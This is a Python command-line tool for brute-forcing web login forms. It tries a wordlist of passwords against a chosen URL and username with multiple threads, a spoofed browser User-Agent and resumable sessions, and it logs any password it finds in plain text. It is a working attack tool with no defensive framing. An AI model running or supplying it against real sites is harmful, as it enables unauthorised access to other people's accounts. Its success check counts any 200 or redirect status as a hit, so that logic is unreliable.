#!/usr/bin/env python3
import random
import requests
from termcolor import colored
import os
import time
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import argparse
import json
from datetime import datetime

# === Configuration ===
MAX_THREADS = 10  # Adjust based on your system and target server capacity
REQUEST_TIMEOUT = 15
LOG_FILE = "bruteforce_log.json"
SESSION_FILE = "session_state.json"

# === Random ASCII Headers ===
ascii_headers = [
    """\
 __            __         _                                      
 \ \   ___ ___ / /__  ____(_)____ _   _____  _________  ________ _
  \ \ / _ `/ _  / _ \/ __/ / __ `/  / ___/ / ___/ __ \/ ___/ _ `/
 /_/ \_,_/\_,_/\___/_/ /_/\_,_/(_) /_/    /_/   \___/_/   \_,_/  
""",
    """\
 ____        _     _            _      _             
| __ )  __ _| |__ | | ___   ___| | __ (_) __ _ _ __  
|  _ \ / _` | '_ \| |/ _ \ / __| |/ / | |/ _` | '_ \ 
| |_) | (_| | |_) | | (_) | (__|   < _| | (_| | | | |
|____/ \__,_|_.__/|_|\___/ \___|_|\_(_)_|\__,_|_| |_|
""",
    """\
 _      ____   _____ ______   _______ ____  _____  
| |    / __ \ / ____|  ____| |__   __/ __ \|  __ \ 
| |   | |  | | (___ | |__       | | | |  | | |__) |
| |   | |  | |\___ \|  __|      | | | |  | |  _  / 
| |___| |__| |____) | |____     | | | |__| | | \ \ 
|______\____/|_____/|______|    |_|  \____/|_|  \_\
"""
]

# === Color Themes ===
themes = [
    ("green", "on_black"),
    ("yellow", "on_blue"),
    ("cyan", "on_red"),
    ("magenta", "on_white"),
    ("white", "on_grey")
]

# === Setup Logging ===
def setup_logging():
    """Configure logging to file and console."""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('bruteforce.log'),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger('bruteforce')

logger = setup_logging()

# === Utility Functions ===
def clear():
    """Clear the terminal screen."""
    os.system("cls" if os.name == "nt" else "clear")

def display_banner():
    """Display a randomly-selected ASCII banner with random colors."""
    clear()
    ascii_art = random.choice(ascii_headers)
    fg, bg = random.choice(themes)
    print(colored(ascii_art, fg, bg))

def validate_url(url):
    """Validate the target URL."""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def load_wordlist(wordlist_path):
    """Load and validate wordlist file."""
    if not os.path.exists(wordlist_path):
        logger.error(f"Wordlist file not found: {wordlist_path}")
        return None
    
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
            if not passwords:
                logger.error("Wordlist is empty")
                return None
            return passwords
    except Exception as e:
        logger.error(f"Error reading wordlist: {e}")
        return None

def save_session(target_url, username, wordlist_path, current_index):
    """Save current session state."""
    session_data = {
        'target_url': target_url,
        'username': username,
        'wordlist_path': wordlist_path,
        'current_index': current_index,
        'timestamp': datetime.now().isoformat()
    }
    try:
        with open(SESSION_FILE, 'w') as f:
            json.dump(session_data, f)
        logger.info(f"Session saved at index {current_index}")
    except Exception as e:
        logger.error(f"Error saving session: {e}")

def load_session():
    """Load previous session state."""
    if not os.path.exists(SESSION_FILE):
        return None
    
    try:
        with open(SESSION_FILE, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Error loading session: {e}")
        return None

def log_result(success, target_url, username, password=None, attempts=0):
    """Log the result of the bruteforce attempt."""
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'target_url': target_url,
        'username': username,
        'success': success,
        'password': password,
        'attempts': attempts
    }
    
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        logger.error(f"Error writing to log file: {e}")

# === Bruteforce Login Function ===
def attempt_login(url, username, password, username_field, password_field, success_indicator):
    """Attempt a single login."""
    try:
        data = {username_field: username, password_field: password}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        }
        
        with requests.Session() as session:
            response = session.post(
                url,
                data=data,
                headers=headers,
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True
            )
            
            # Check for success conditions
            if (success_indicator.lower() in response.text.lower() or 
                response.status_code in [200, 302, 301]):
                return True, password
                
    except requests.exceptions.RequestException as e:
        logger.debug(f"Request error for {password}: {e}")
    
    return False, None

def bruteforce_login(target_url, username, wordlist_path, username_field='username', 
                    password_field='password', success_indicator='Welcome', 
                    resume=False, threads=MAX_THREADS):
    """
    Perform a bruteforce login attempt using a wordlist with multithreading.
    
    Args:
        target_url (str): Target login URL.
        username (str): Username to attempt login with.
        wordlist_path (str): Path to the password wordlist file.
        username_field (str): Name of the username field in the login form.
        password_field (str): Name of the password field in the login form.
        success_indicator (str): Text that indicates successful login.
        resume (bool): Whether to resume from a saved session.
        threads (int): Number of concurrent threads to use.
        
    Returns:
        str: The correct password if found, or None if not found.
    """
    # Validate URL
    if not validate_url(target_url):
        logger.error("Invalid target URL")
        return None
        
    # Load wordlist
    passwords = load_wordlist(wordlist_path)
    if not passwords:
        return None
        
    # Resume from session if requested
    start_index = 0
    if resume:
        session = load_session()
        if session and session.get('wordlist_path') == wordlist_path:
            start_index = session.get('current_index', 0)
            logger.info(f"Resuming from password {start_index + 1}/{len(passwords)}")
    
    found_password = None
    attempts = 0
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for i, password in enumerate(passwords[start_index:], start=start_index):
                if found_password:
                    break
                    
                futures.append(
                    executor.submit(
                        attempt_login,
                        target_url,
                        username,
                        password,
                        username_field,
                        password_field,
                        success_indicator
                    )
                )
                
                # Save session every 100 attempts
                if i % 100 == 0:
                    save_session(target_url, username, wordlist_path, i)
                
            for future in as_completed(futures):
                attempts += 1
                success, password = future.result()
                
                if success:
                    found_password = password
                    logger.info(colored(f"\n[+] Password Found: {password}", "green"))
                    executor.shutdown(wait=False)
                    for f in futures:
                        f.cancel()
                    break
                    
                if attempts % 10 == 0:
                    logger.info(f"Attempts: {attempts}, Last tried: {password}")
                    
    except KeyboardInterrupt:
        logger.info("\n[!] Received keyboard interrupt. Shutting down...")
        save_session(target_url, username, wordlist_path, start_index + attempts)
        return None
        
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        return None
        
    # Log the result
    if found_password:
        log_result(True, target_url, username, found_password, attempts)
        if os.path.exists(SESSION_FILE):
            os.remove(SESSION_FILE)
    else:
        log_result(False, target_url, username, attempts=attempts)
        
    return found_password

# === Main Execution ===
def main():
    display_banner()
    
    # Set up argument parser
    parser = argparse.ArgumentParser(description="Advanced Bruteforce Login Tool")
    parser.add_argument("url", help="Target login URL")
    parser.add_argument("username", help="Username to bruteforce")
    parser.add_argument("wordlist", help="Path to password wordlist file")
    parser.add_argument("--user-field", default="username", help="Username form field name")
    parser.add_argument("--pass-field", default="password", help="Password form field name")
    parser.add_argument("--success-text", default="Welcome", help="Text indicating successful login")
    parser.add_argument("--resume", action="store_true", help="Resume from last session")
    parser.add_argument("--threads", type=int, default=MAX_THREADS, help="Number of threads to use")
    
    args = parser.parse_args()
    
    logger.info("\n[+] Starting Bruteforce...\n")
    logger.info(f"Target URL: {args.url}")
    logger.info(f"Username: {args.username}")
    logger.info(f"Wordlist: {args.wordlist}")
    logger.info(f"Threads: {args.threads}")
    
    start_time = time.time()
    result = bruteforce_login(
        args.url,
        args.username,
        args.wordlist,
        args.user_field,
        args.pass_field,
        args.success_text,
        args.resume,
        args.threads
    )
    
    end_time = time.time()
    elapsed = end_time - start_time
    
    if result:
        logger.info(colored(f"\n[✓] Login successful! Password: {result}", "green"))
        logger.info(f"Time elapsed: {elapsed:.2f} seconds")
    else:
        logger.info(colored("\n[✗] Login failed. No valid password found.", "red"))
        logger.info(f"Time elapsed: {elapsed:.2f} seconds")

if __name__ == "__main__":
    main()
